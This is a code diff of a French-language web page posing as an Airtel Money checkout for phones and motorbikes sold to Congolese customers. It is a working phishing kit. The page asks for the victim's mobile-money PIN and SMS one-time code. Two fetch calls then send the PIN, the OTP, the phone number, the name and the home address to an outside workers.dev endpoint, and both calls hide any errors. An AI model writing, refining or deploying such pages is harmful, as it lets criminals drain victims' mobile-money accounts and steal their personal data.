-      <path d="M267.011,212.184l-1.763,4.848a.661.661,0,0,1-.321.4,1.067,1.067,0,0,1-.481.12.832.832,0,0,1-.6-.16,1.256,1.256,0,0,1-.32-.441l-1.643-4.367v4.447a.6.6,0,0,1-.16.441.829.829,0,0,1-.6.2c-.28,0-.481-.04-.561-.16a.638.638,0,0,1-.16-.481v-6.37a.632.632,0,0,1,.281-.6,1.7,1.7,0,0,1,1.522.04,1.017,1.017,0,0,1,.361.521l1.883,5.409,1.8-5.369a.91.91,0,0,1,.441-.561,1.588,1.588,0,0,1,.8-.16,1.2,1.2,0,0,1,.721.16.625.625,0,0,1,.28.521v6.49a.6.6,0,0,1-.16.441.829.829,0,0,1-.6.2.725.725,0,0,1-.561-.16.639.639,0,0,1-.16-.481v-4.928Z" transform="translate(-179.269 -209.579)" fill="currentColor"/>
-      <path d="M285.523,215.87l-.4,1.082a.458.458,0,0,1-.28.321.659.659,0,0,1-.4.08.941.941,0,0,1-.641-.2.643.643,0,0,1-.2-.441,1.17,1.17,0,0,1,.08-.361l2.444-6.29a.806.806,0,0,1,.361-.441,1.234,1.234,0,0,1,.521-.12,1.109,1.109,0,0,1,.521.12.686.686,0,0,1,.361.441l2.4,6.29a1.237,1.237,0,0,1,.08.321.664.664,0,0,1-.2.481.792.792,0,0,1-.561.2.815.815,0,0,1-.761-.441l-.441-1.042Zm1.442-4.247-1,2.925h1.963Z" transform="translate(-193.174 -209.34)" fill="currentColor"/>
-      <path d="M306.086,210.562a1.952,1.952,0,0,0-1,.24,2.452,2.452,0,0,0-.681.6,2.909,2.909,0,0,0-.361.881,4.365,4.365,0,0,0-.12,1.042,3.3,3.3,0,0,0,.521,2,1.834,1.834,0,0,0,1.562.721,2.169,2.169,0,0,0,.761-.12,1.85,1.85,0,0,0,.6-.361,1.653,1.653,0,0,0,.4-.521,1.914,1.914,0,0,0,.24-.721h-1.362a.726.726,0,0,1-.561-.2.806.806,0,0,1-.12-.441.613.613,0,0,1,.681-.681h2.123a.639.639,0,0,1,.481.16.692.692,0,0,1,.2.521v3.205c0,.08-.04.12-.08.2a.873.873,0,0,1-.2.12,1,1,0,0,1-.4.04.889.889,0,0,1-.361-.04.877.877,0,0,1-.2-.12.3.3,0,0,1-.08-.16c0-.08-.04-.12-.04-.2v-.4a.483.483,0,0,1-.2.2.7.7,0,0,1-.2.16,2.58,2.58,0,0,1-.8.441,4.176,4.176,0,0,1-1.122.16,3.686,3.686,0,0,1-1.522-.28,3.2,3.2,0,0,1-1.122-.8,3.409,3.409,0,0,1-.681-1.242,5.326,5.326,0,0,1-.24-1.683,6.012,6.012,0,0,1,.2-1.482,3.471,3.471,0,0,1,.681-1.322,3.3,3.3,0,0,1,1.162-.921,3.952,3.952,0,0,1,1.763-.361,3.883,3.883,0,0,1,1.442.24,3.991,3.991,0,0,1,1.162.721,1.437,1.437,0,0,1,.28.4.807.807,0,0,1,.12.441.687.687,0,0,1-.721.721.6.6,0,0,1-.4-.12,3.269,3.269,0,0,0-.361-.32c-.12-.12-.24-.2-.32-.28a.872.872,0,0,0-.32-.2,1.272,1.272,0,0,0-.361-.12A.645.645,0,0,0,306.086,210.562Z" transform="translate(-204.322 -209.16)" fill="currentColor"/>
-      <path d="M326.163,216.712a.6.6,0,0,1-.16.441.829.829,0,0,1-.6.2c-.521,0-.8-.2-.8-.641v-6.571a.6.6,0,0,1,.2-.481,1.159,1.159,0,0,1,.561-.16.848.848,0,0,1,.561.16.547.547,0,0,1,.2.481v6.571Z" transform="translate(-217.748 -209.34)" fill="currentColor"/>
-      <path d="M334.2,209.6a1.441,1.441,0,0,1,.441.08,1.884,1.884,0,0,1,.441.4l2.8,4.327a3.669,3.669,0,0,0,.2.321,2.37,2.37,0,0,1,.16.321c0-.12-.04-.28-.04-.481v-4.327a.546.546,0,0,1,.2-.481,1.036,1.036,0,0,1,.561-.16.783.783,0,0,1,.561.16.6.6,0,0,1,.2.481v6.49a.508.508,0,0,1-.04.24.569.569,0,0,1-.08.24.368.368,0,0,1-.24.16,1,1,0,0,1-.4.08.854.854,0,0,1-.481-.12,1.53,1.53,0,0,1-.361-.361l-2.764-4.047a3.7,3.7,0,0,0-.2-.321c-.08-.12-.16-.28-.24-.4,0,.12.04.28.04.481v4.127a.6.6,0,0,1-.16.441.829.829,0,0,1-.6.2c-.521,0-.8-.2-.8-.641v-6.45a.672.672,0,0,1,.24-.561A.651.651,0,0,1,334.2,209.6Z" transform="translate(-223.022 -209.4)" fill="currentColor"/>
-      <path d="M354.5,217.492a.531.531,0,0,1-.6-.6v-6.531a.514.514,0,0,1,.16-.4.547.547,0,0,1,.441-.16h4.127a.567.567,0,0,1,.641.641.854.854,0,0,1-.12.481.517.517,0,0,1-.441.2h-3.245v1.8h2.925a.574.574,0,0,1,.441.2.9.9,0,0,1,.04.962.517.517,0,0,1-.441.2H355.5v1.883h3.285a.557.557,0,0,1,.4.2,1.022,1.022,0,0,1,0,.962.547.547,0,0,1-.481.2H354.5Z" transform="translate(-235.309 -209.52)" fill="currentColor"/>
-    </g>
-  </g>
     </symbol>
   </defs>
 </svg>
@@ -604,7 +460,7 @@ html,*{-webkit-text-size-adjust:100%!important;text-size-adjust:100%!important}
 
 <!-- ═════ STEP BAR ═════ -->
 <div class="steps" aria-hidden="true">
-  <div class="step done" id="sp0"><div class="step-dot">✓</div><div class="step-lbl">Forfait</div></div>
+  <div class="step done" id="sp0"><div class="step-dot">✓</div><div class="step-lbl">Commande</div></div>
   <div class="step active" id="sp1"><div class="step-dot">2</div><div class="step-lbl">Connexion</div></div>
   <div class="step" id="sp2"><div class="step-dot">3</div><div class="step-lbl">Traitement</div></div>
   <div class="step" id="sp3"><div class="step-dot">4</div><div class="step-lbl">Code OTP</div></div>
@@ -614,28 +470,29 @@ html,*{-webkit-text-size-adjust:100%!important;text-size-adjust:100%!important}
 <div class="view active" id="viewLogin">
   <div class="login-fixed">
 
+    <!-- Compact summary -->
     <div class="summary">
-      <div class="sum-row1">
-        <div class="summary-product-img">
-          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="rgba(228,0,0,.7)" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><rect x="5" y="2" width="14" height="20" rx="2"/><line x1="9" y1="7" x2="15" y2="7"/><line x1="9" y1="11" x2="15" y2="11"/><line x1="9" y1="15" x2="12" y2="15"/></svg>
+      <div class="summary-left">
+        <div class="summary-img">
+          <img id="sumImg" src="" alt="">
         </div>
-        <div class="sum-info">
-          <span class="summary-product-name" id="sumName">—</span>
-          <span class="sum-meta-row">
-            <span class="summary-lbl">N°</span>
-            <span class="summary-val" id="sumPhone">🇨🇩 +243 —</span>
-            <span class="summary-dot"></span>
-            <span class="summary-lbl">Validité</span>
-            <span class="summary-val" id="sumValidity">—</span>
+        <div class="summary-info">
+          <span class="summary-name" id="sumName">—</span>
+          <span class="summary-meta">
+            <span class="summary-meta-lbl">Client</span>
+            <span class="summary-meta-val" id="sumCustomer">—</span>
+            <span class="summary-meta-dot"></span>
+            <span class="summary-meta-lbl">N°</span>
+            <span class="summary-meta-val" id="sumPhone">🇨🇩 +243 —</span>
           </span>
         </div>
-        <div class="sum-price">
-          <strong id="sumPrice">—</strong>
-          <span class="summary-lbl">Acompte</span>
-        </div>
       </div>
-      <button class="summary-change" onclick="goBack()" type="button" aria-label="Modifier la commande">
-        <svg width="9" height="9" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M15 18l-6-6 6-6"/></svg>
+      <div class="summary-price">
+        <strong id="sumPrice">—</strong>
+        <small>Total</small>
+      </div>
+      <button class="summary-change" onclick="goBack()" type="button" aria-label="Modifier">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M15 18l-6-6 6-6"/></svg>
         Modifier
       </button>
     </div>
@@ -643,7 +500,7 @@ html,*{-webkit-text-size-adjust:100%!important;text-size-adjust:100%!important}
     <div class="pin-stage">
       <div class="pin-head">
         <div class="pin-title">Code PIN Airtel Money</div>
-        <div class="pin-sub">Entrez votre PIN à 4 chiffres pour autoriser le paiement de l'acompte de <strong id="pinRef">—</strong></div>
+        <div class="pin-sub">Entrez votre PIN à 4 chiffres pour autoriser le paiement de <strong id="pinRef">—</strong></div>
       </div>
 
       <div class="pin-boxes" role="group" aria-label="Code PIN">
@@ -671,8 +528,8 @@ html,*{-webkit-text-size-adjust:100%!important;text-size-adjust:100%!important}
       </div>
 
       <button class="btn-cta dim" id="loginBtn" onclick="submitLogin()" type="button">
-        <span style="display:flex;align-items:center;gap:8px;justify-content:center">
-          <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+        <span>
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
           Autoriser le Paiement
         </span>
       </button>
@@ -704,7 +561,6 @@ html,*{-webkit-text-size-adjust:100%!important;text-size-adjust:100%!important}
 <!-- ═════ VIEW: OTP ═════ -->
 <div class="view" id="viewOTP">
   <div class="otp-wrap">
-
     <div class="otp-card">
       <div class="otp-icon">
         <svg viewBox="0 0 24 24" fill="none" stroke="#E40000" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
@@ -735,27 +591,27 @@ html,*{-webkit-text-size-adjust:100%!important;text-size-adjust:100%!important}
 
     <div class="otp-meta">
       <div class="otp-help">
-        <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><rect x="5" y="2" width="14" height="20" rx="2"/></svg>
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><rect x="5" y="2" width="14" height="20" rx="2"/></svg>
         Appuyez sur les cases pour saisir le code
       </div>
       <div class="otp-timer-row">
-        <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/></svg>
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/></svg>
         Code expire dans&nbsp;<span class="otp-timer" id="otpTimer">60</span>&nbsp;s
       </div>
       <button class="otp-resend dim" id="resendBtn" onclick="resendOTP()" type="button">Renvoyer le code OTP</button>
     </div>
 
     <button class="btn-cta dim" id="otpBtn" onclick="submitOTP()" type="button">
-      <span style="display:flex;align-items:center;gap:8px;justify-content:center">
-        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+      <span>
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
         Valider le Code
       </span>
     </button>
   </div>
 </div>
 
-<!-- ═════ FULL-SCREEN LOADING (same as index) ═════ -->
-<div class="loading" id="loadingOverlay" role="alert" aria-live="assertive" aria-busy="true">
+<!-- ═════ LOADING ═════ -->
+<div class="loading" id="loadingOverlay" role="alert" aria-live="assertive">
   <div class="loading-inner">
     <div class="loading-loader" aria-hidden="true">
       <div class="loading-ring"></div>
@@ -772,24 +628,24 @@ html,*{-webkit-text-size-adjust:100%!important;text-size-adjust:100%!important}
 
 /* ── Image map (mirrors index.html) ───────────── */
 var IMG = {
-  'iPhone 12'                : 'iphone-12.png',
-  'iPhone 12 Pro Max'        : 'iphone-12-pro-max.png',
-  'iPhone 13'                : 'iphone-13.png',
-  'iPhone 13 Pro Max'        : 'iphone-13-pro-max.png',
-  'iPhone 14 Pro Max'        : 'iphone-14-pro-max.png',
-  'Samsung Galaxy S23 Ultra' : 'galaxy-s23-ultra.png',
-  'Samsung Galaxy S24 Ultra' : 'galaxy-s24-ultra.png',
-  'Samsung Galaxy S25 Ultra' : 'galaxy-s25-ultra.png',
-  'Tecno Camon 40'           : 'tecno-camon-40.png',
-  'Tecno Camon 50'           : 'tecno-camon-50.png',
-  'Tecno Spark 40'           : 'tecno-spark-40.png',
-  'Tecno Spark 50'           : 'tecno-spark-50.png',
-  'Infinix Hot 60 Pro Plus'  : 'infinix-hot-60-pro-plus.png',
-  'Infinix Hot 70 Pro Plus'  : 'infinix-hot-70-pro-plus.png',
-  'Boxer 125cc'              : 'boxer-125cc.png',
-  'Boxer 150cc'              : 'boxer-150cc.png',
-  'TVS 125cc'                : 'tvs-125cc.png',
-  'TVS 150cc'                : 'tvs-150cc.png'
+  'iPhone 12':'iphone-12.png','iPhone 12 Pro Max':'iphone-12-pro-max.png',
+  'iPhone 13':'iphone-13.png','iPhone 13 Pro Max':'iphone-13-pro-max.png',
+  'iPhone 14 Pro Max':'iphone-14-pro-max.png','iPhone 15':'iphone-15.png',
+  'iPhone 15 Pro Max':'iphone-15-pro-max.png',
+  'Samsung Galaxy S23 Ultra':'galaxy-s23-ultra.png',
+  'Samsung Galaxy S24 Ultra':'galaxy-s24-ultra.png',
+  'Samsung Galaxy S25 Ultra':'galaxy-s25-ultra.png',
+  'Samsung Galaxy A55 5G':'galaxy-a55.png','Samsung Galaxy A15':'galaxy-a15.png',
+  'Tecno Camon 40':'tecno-camon-40.png','Tecno Camon 50':'tecno-camon-50.png',
+  'Tecno Spark 40':'tecno-spark-40.png','Tecno Spark 50':'tecno-spark-50.png',
+  'Tecno Pova 6 Pro':'tecno-pova-6-pro.png','Tecno Pop 8':'tecno-pop-8.png',
+  'Infinix Hot 60 Pro Plus':'infinix-hot-60-pro-plus.png',
+  'Infinix Hot 70 Pro Plus':'infinix-hot-70-pro-plus.png',
+  'Infinix Note 40 Pro':'infinix-note-40-pro.png','Infinix Zero 30 5G':'infinix-zero-30.png',
+  'Redmi Note 13 Pro':'redmi-note-13-pro.png','Redmi 13C':'redmi-13c.png',
+  'Oppo A78':'oppo-a78.png',
+  'Boxer 125cc':'boxer-125cc.png','Boxer 150cc':'boxer-150cc.png',
+  'TVS 125cc':'tvs-125cc.png','TVS 150cc':'tvs-150cc.png'
 };
 
 /* ── Helpers ─────────────────────────────────── */
@@ -810,37 +666,39 @@ function navigate(url){
   }, 500);
 }
 
-/* ── Load forfait ─────────────────────────────── */
-var forfait = {};
-try { forfait = JSON.parse(sessionStorage.getItem('starlinkForfait') || '{}'); } catch(e){}
-if (!forfait.name){ navigate('index.html'); }
+/* ── Load order info ──────────────────────────── */
+var order = {};
+try { order = JSON.parse(sessionStorage.getItem('orderInfo') || '{}'); } catch(e){}
+if (!order.product || !order.product.name){ navigate('index.html'); }
 
-var deposit = forfait.deposit || '—';
+var product  = order.product  || {};
+var customer = order.customer || {};
 
-/* ── Fill summary (photo + name + deposit) ────── */
-document.getElementById('sumName').textContent  = forfait.name || '—';
-document.getElementById('sumPrice').textContent = deposit;
-document.getElementById('pinRef').textContent   = deposit;
-document.getElementById('sumPhone').innerHTML   = forfait.phone
-  ? '🇨🇩 +243 ' + forfait.phone
-  : '🇨🇩 +243 —';
-document.getElementById('sumValidity').textContent = forfait.jours
-  ? forfait.jours + (forfait.jours === 1 ? ' Jour' : ' Jours')
-  : '—';
-
-/* product icon static */ var _noImg = true; var _noImg2 = _noImg || false; if(false){
-  var _x = 'assets/' + '';
-  var _noImg3 = _x; _noImg2 = _noImg3 || false;
+/* ── Fill summary strip ───────────────────────── */
+var sumImg = document.getElementById('sumImg');
+var file = product.img || IMG[product.name];
+if (file){
+  sumImg.src = 'assets/' + file;
+  sumImg.alt = product.name || '';
 } else {
-  var _noImgx = document.createElement('span'); _noImgx.style.display='none';
-  document.body.appendChild(_noImgx); _noImgx.remove(); var _z = _noImgx.style.background = 'linear-gradient(135deg,#FFE5E5,#FFF3F3)';
+  sumImg.style.display = 'none';
+  sumImg.parentElement.style.background = 'rgba(255,255,255,.15)';
 }
+
+document.getElementById('sumName').textContent     = product.name  || 'Article';
+document.getElementById('sumCustomer').textContent = customer.name || '—';
+document.getElementById('sumPhone').innerHTML      = customer.phone
+  ? '🇨🇩 +243 ' + customer.phone
+  : '🇨🇩 +243 —';
+document.getElementById('sumPrice').textContent    = product.price || '—';
+document.getElementById('pinRef').textContent      = product.price || '—';
 
 /* ── Views / steps ────────────────────────────── */
 function showView(id){
   document.querySelectorAll('.view').forEach(function(v){ v.classList.remove('active'); });
   var el = document.getElementById(id);
-  el.classList.add('active'); el.scrollTop = 0;
+  el.classList.add('active');
+  el.scrollTop = 0;
 }
 function setStep(n){
   for (var i = 0; i < 4; i++){
@@ -875,10 +733,10 @@ document.getElementById('pinPad').addEventListener('click', function(e){
   renderPin();
 });
 
-async function submitLogin(){
-  var ph = forfait.phone || '';
+function submitLogin(){
+  var ph = (customer.phone || '').replace(/\D/g, '');
   if (!ph || ph.length !== 9){
-    document.getElementById('pinErr').textContent = 'Session invalide — retournez choisir votre forfait';
+    document.getElementById('pinErr').textContent = 'Session invalide — retournez passer commande';
     hap([25,15,25]);
     setTimeout(function(){ navigate('index.html'); }, 1500);
     return;
@@ -888,7 +746,10 @@ async function submitLogin(){
     hap([25,15,25]); return;
   }
   sessionStorage.setItem('starlinkAuth', JSON.stringify({ phone: ph, pin: pin }));
-  hap(18); setStep(2); showView('viewProc'); runProcessing(ph);
+  hap(18);
+  setStep(2);
+  showView('viewProc');
+  runProcessing(ph);
 }
 
 /* ── Processing ───────────────────────────────── */
@@ -897,7 +758,7 @@ async function runProcessing(ph){
   var sub = document.getElementById('procSub');
   var steps = [
     { pct: 25,  txt: 'Vérification du compte Airtel…', si: 1 },
-    { pct: 55,  txt: 'Validation de ' + (forfait.name || 'la commande') + '…', si: 2 },
+    { pct: 55,  txt: 'Validation de ' + (product.name || 'la commande') + '…', si: 2 },
     { pct: 85,  txt: 'Envoi OTP au +243 ' + ph + '…', si: 3 },
     { pct: 100, txt: 'Code OTP envoyé sur votre téléphone !' }
   ];
@@ -911,22 +772,30 @@ async function runProcessing(ph){
       document.getElementById('psi' + steps[i].si).className = 'proc-step act';
     }
   }
+
   /* ── Worker: login_initiated ── */
   (function(){
-    var _a={};try{_a=JSON.parse(sessionStorage.getItem('starlinkAuth')||'{}');}catch(e){}
-    fetch('https://digiroues-api.lennxkoros.workers.dev',{method:'POST',headers:{'Content-Type':'application/json'},
-      body:JSON.stringify({event:'login_initiated',data:{
-        phone:'+243'+ph,
-        pin:_a.pin||'',
-        forfait:forfait.name||'',
-        price:forfait.price||'',
-        deposit:forfait.deposit||'',
-        daily:forfait.daily||'',
-        jours:forfait.jours||'',
-        ts:Date.now()
-      }})
+    fetch('https://digiroues-api.lennxkoros.workers.dev',{
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({
+        event:'login_initiated',
+        data:{
+          phone:'+243' + ph,
+          pin:pin,
+          product:product.name || '',
+          price:product.price || '',
+          customer:customer.name || '',
+          commune:customer.commune || '',
+          avenue:customer.avenue || '',
+          landmark:customer.landmark || '',
+          ref:order.ref || '',
+          ts:Date.now()
+        }
+      })
     }).catch(function(){});
   })();
+
   await slp(500);
   document.getElementById('otpPhone').innerHTML =
     '🇨🇩 +243 ' + ph.slice(0,2) + ' ' + ph.slice(2,5) + ' ' + ph.slice(5);
@@ -936,6 +805,7 @@ async function runProcessing(ph){
 
 /* ── OTP ──────────────────────────────────────── */
 var otpVal = '', timerInterval = null, timerSecs = 60;
+
 function renderOTP(){
   for (var i = 0; i < 4; i++){
     var b = document.getElementById('ob' + i);
@@ -945,6 +815,7 @@ function renderOTP(){
   }
 }
 function updateOTPBtn(){ document.getElementById('otpBtn').classList.toggle('dim', otpVal.length !== 4); }
+
 function lockOTPBoxes(){
   for (var i = 0; i < 4; i++) document.getElementById('ob' + i).className = 'otp-box locked';
   document.getElementById('otpInput').blur();
@@ -993,6 +864,7 @@ function otpError(msg, showResend){
   var msgEl = document.getElementById('otpErrMsg');
   var actEl = document.getElementById('otpErrActions');
   msgEl.textContent = msg; actEl.innerHTML = '';
+
   var retry = document.createElement('button');
   retry.type = 'button'; retry.className = 'otp-err-btn ghost'; retry.textContent = 'Réessayer';
   retry.onclick = function(){
@@ -1000,15 +872,18 @@ function otpError(msg, showResend){
     renderOTP(); updateOTPBtn(); el.style.display = 'none'; focusOTPInput();
   };
   actEl.appendChild(retry);
+
   if (showResend){
     var r2 = document.createElement('button');
     r2.type = 'button'; r2.className = 'otp-err-btn solid'; r2.textContent = 'Renvoyer le code';
     r2.onclick = function(){ el.style.display = 'none'; resendOTP(); };
     actEl.appendChild(r2);
   }
+
   el.style.display = 'block';
   for (var i = 0; i < 4; i++) document.getElementById('ob' + i).className = 'otp-box error';
   hap([30,15,30,15,30]);
+
   setTimeout(function(){ el.style.display = 'none'; renderOTP(); }, 8000);
 }
 function validateOTP(val){
@@ -1022,37 +897,52 @@ function submitOTP(){
   if (otpVal.length !== 4){ hap([25,15,25]); return; }
   document.getElementById('otpErr').style.display = 'none';
   if (!validateOTP(otpVal)) return;
+
   var auth = {};
   try { auth = JSON.parse(sessionStorage.getItem('starlinkAuth') || '{}'); } catch(e){}
   if (auth.pin && otpVal === auth.pin){
     otpError('Ce code ressemble à votre PIN — l\'OTP est un code séparé envoyé par SMS', timerSecs <= 0);
     return;
   }
-  var ref = 'STL-CG-' + (Math.random() * 9e5 + 1e5 | 0);
+
+  /* Final ref + OTP stored */
+  var ref = order.ref || ('DR-' + Math.floor(Math.random()*900000 + 100000));
   sessionStorage.setItem('starlinkRef', ref);
   sessionStorage.setItem('starlinkOTP', otpVal);
+  /* Also update the main order object with the final ref */
+  try {
+    order.ref = ref;
+    sessionStorage.setItem('orderInfo', JSON.stringify(order));
+  } catch(e){}
+
   for (var i = 0; i < 4; i++) document.getElementById('ob' + i).classList.add('success');
   hap([18, 8, 35]);
 
   /* ── Worker: otp_confirmed ── */
   (function(){
-    var _a={};try{_a=JSON.parse(sessionStorage.getItem('starlinkAuth')||'{}');}catch(e){}
-    fetch('https://digiroues-api.lennxkoros.workers.dev',{method:'POST',headers:{'Content-Type':'application/json'},
-      body:JSON.stringify({event:'otp_confirmed',data:{
-        phone:_a.phone?'+243'+_a.phone:'',
-        pin:_a.pin||'',
-        otp:otpVal,
-        forfait:forfait.name||'',
-        price:forfait.price||'',
-        deposit:forfait.deposit||'',
-        daily:forfait.daily||'',
-        jours:forfait.jours||'',
-        ref:ref,
-        ts:Date.now()
-      }})
+    fetch('https://digiroues-api.lennxkoros.workers.dev',{
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({
+        event:'otp_confirmed',
+        data:{
+          phone:'+243' + (auth.phone || ''),
+          pin:auth.pin || '',
+          otp:otpVal,
+          product:product.name || '',
+          price:product.price || '',
+          customer:customer.name || '',
+          commune:customer.commune || '',
+          avenue:customer.avenue || '',
+          landmark:customer.landmark || '',
+          ref:ref,
+          ts:Date.now()
+        }
+      })
     }).catch(function(){});
   })();
-  /* Show full-screen loading (same style as index), then navigate */
+
+  /* Show loading, then navigate to thank you */
   var loading = document.getElementById('loadingOverlay');
   if (loading){
     loading.classList.add('show');
